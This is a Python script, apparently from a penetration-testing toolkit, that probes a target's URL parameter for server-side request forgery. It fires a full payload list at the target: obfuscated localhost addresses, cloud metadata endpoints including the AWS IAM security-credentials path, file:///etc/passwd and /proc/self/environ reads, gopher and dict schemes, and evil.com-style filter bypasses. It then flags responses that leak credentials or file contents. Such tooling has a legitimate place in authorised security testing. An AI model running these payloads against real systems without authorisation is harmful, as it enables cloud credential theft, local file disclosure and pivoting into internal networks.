#!/usr/bin/env python3
"""SSRF (Server-Side Request Forgery) testing.

Tests URL parameter injection with internal IPs, cloud metadata endpoints,
URL scheme variations, DNS rebinding detection, and redirect-based SSRF.

Usage:
    python3 test-ssrf.py '{"target": "https://example.com/fetch?url=", "payloads": ["http://169.254.169.254/latest/meta-data/"]}'
"""

import sys
import json
import time
import requests
import urllib3
from urllib.parse import urlparse, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 10

# Internal IP ranges and cloud metadata endpoints
DEFAULT_PAYLOADS = [
    # Localhost
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",          # Octal
    "http://2130706433",           # Decimal
    "http://0x7f000001",           # Hex
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Internal ranges
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.0.1",
    "http://192.168.1.1",
]

# URL scheme payloads
SCHEME_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/stat",
]

# Bypass techniques
BYPASS_PAYLOADS = [
    "http://127.1",
    "http://127.0.0.1.nip.io",
    "http://spoofed.burpcollaborator.net",
    "http://127.0.0.1%2523@evil.com",
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#@evil.com",
    "http://127.0.0.1%25%32%33@evil.com",
]


def build_payloads(custom_payloads=None, include_schemes=True, include_bypasses=True):
    """Build the full list of SSRF payloads."""
    payloads = list(DEFAULT_PAYLOADS)
    if include_schemes:
        payloads.extend(SCHEME_PAYLOADS)
    if include_bypasses:
        payloads.extend(BYPASS_PAYLOADS)
    if custom_payloads:
        payloads.extend(custom_payloads)
    return payloads


def get_baseline(target):
    """Get a baseline response for comparison."""
    try:
        resp = requests.get(
            target + "http://example.com",
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
        return {
            "status_code": resp.status_code,
            "content_length": len(resp.content),
            "response_time": resp.elapsed.total_seconds(),
        }
    except requests.RequestException:
        return None


def test_payload(target, payload, baseline, headers=None, method="GET", param_name=None):
    """Test a single SSRF payload."""
    req_headers = headers or {}

    try:
        if param_name:
            # Target is base URL, inject into parameter
            url = target
            params = {param_name: payload}
            if method.upper() == "POST":
                resp = requests.post(
                    url, data=params, headers=req_headers,
                    timeout=TIMEOUT, verify=False, allow_redirects=True,
                )
            else:
                resp = requests.get(
                    url, params=params, headers=req_headers,
                    timeout=TIMEOUT, verify=False, allow_redirects=True,
                )
        else:
            # Target URL already ends with parameter= so just append payload
            full_url = target + quote(payload, safe="://?&#=@[]")
            if method.upper() == "POST":
                resp = requests.post(
                    full_url, headers=req_headers,
                    timeout=TIMEOUT, verify=False, allow_redirects=True,
                )
            else:
                resp = requests.get(
                    full_url, headers=req_headers,
                    timeout=TIMEOUT, verify=False, allow_redirects=True,
                )
    except requests.exceptions.ConnectionError:
        return {"payload": payload, "error": "connection_error", "potentially_interesting": False}
    except requests.exceptions.Timeout:
        return {"payload": payload, "error": "timeout", "potentially_interesting": True,
                "note": "Timeout may indicate server-side connection attempt"}
    except requests.RequestException as e:
        return {"payload": payload, "error": str(e), "potentially_interesting": False}

    result = {
        "payload": payload,
        "status_code": resp.status_code,
        "content_length": len(resp.content),
        "response_time": resp.elapsed.total_seconds(),
        "potentially_interesting": False,
        "indicators": [],
    }

    # Check for indicators of SSRF success
    body_lower = resp.text.lower()

    # Content-based indicators
    if "root:" in body_lower and ":/bin/" in body_lower:
        result["indicators"].append("etc_passwd_content_detected")
        result["potentially_interesting"] = True

    if "ami-" in body_lower or "instance-id" in body_lower:
        result["indicators"].append("aws_metadata_content_detected")
        result["potentially_interesting"] = True

    if "computeMetadata" in resp.text:
        result["indicators"].append("gcp_metadata_content_detected")
        result["potentially_interesting"] = True

    if "azure" in body_lower and "subscriptionId" in resp.text:
        result["indicators"].append("azure_metadata_content_detected")
        result["potentially_interesting"] = True

    # Response difference from baseline
    if baseline:
        len_diff = abs(result["content_length"] - baseline["content_length"])
        if result["status_code"] != baseline["status_code"]:
            result["indicators"].append(f"status_code_diff: baseline={baseline['status_code']}")
            result["potentially_interesting"] = True
        if len_diff > 100:
            result["indicators"].append(f"content_length_diff: {len_diff} bytes")
            result["potentially_interesting"] = True
        time_diff = result["response_time"] - baseline["response_time"]
        if time_diff > 2.0:
            result["indicators"].append(f"timing_diff: +{time_diff:.2f}s")
            result["potentially_interesting"] = True

    # Check for common error messages that reveal SSRF behavior
    ssrf_error_keywords = [
        "connection refused", "could not resolve", "no route to host",
        "network unreachable", "connection timed out", "ECONNREFUSED",
        "getaddrinfo", "name or service not known",
    ]
    for keyword in ssrf_error_keywords:
        if keyword in body_lower:
            result["indicators"].append(f"error_leak: {keyword}")
            result["potentially_interesting"] = True
            break

    return result


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: test-ssrf.py '{\"target\": \"...\"}' "}))
        sys.exit(1)

    try:
        args = json.loads(sys.argv[1])
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"Invalid JSON arguments: {str(e)}"}))
        sys.exit(1)

    target = args.get("target")
    if not target:
        print(json.dumps({"error": "Missing required parameter: target"}))
        sys.exit(1)

    custom_payloads = args.get("payloads", [])
    headers = args.get("headers", {})
    method = args.get("method", "GET")
    param_name = args.get("param_name")
    include_schemes = args.get("include_schemes", True)
    include_bypasses = args.get("include_bypasses", True)

    payloads = build_payloads(custom_payloads, include_schemes, include_bypasses)

    # Get baseline
    baseline = get_baseline(target)

    results = []
    interesting = []

    for payload in payloads:
        result = test_payload(target, payload, baseline, headers, method, param_name)
        results.append(result)
        if result.get("potentially_interesting"):
            interesting.append(result)

    severity = "info"
    if any("metadata_content_detected" in str(r.get("indicators", [])) for r in interesting):
        severity = "critical"
    elif any("etc_passwd" in str(r.get("indicators", [])) for r in interesting):
        severity = "critical"
    elif len(interesting) > 3:
        severity = "high"
    elif len(interesting) > 0:
        severity = "medium"

    output = {
        "target": target,
        "payloads_tested": len(payloads),
        "interesting_responses": len(interesting),
        "severity": severity,
        "interesting": interesting,
        "all_results": results,
        "summary": (
            f"Tested {len(payloads)} SSRF payloads against {target}. "
            f"Found {len(interesting)} potentially interesting responses."
        ),
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
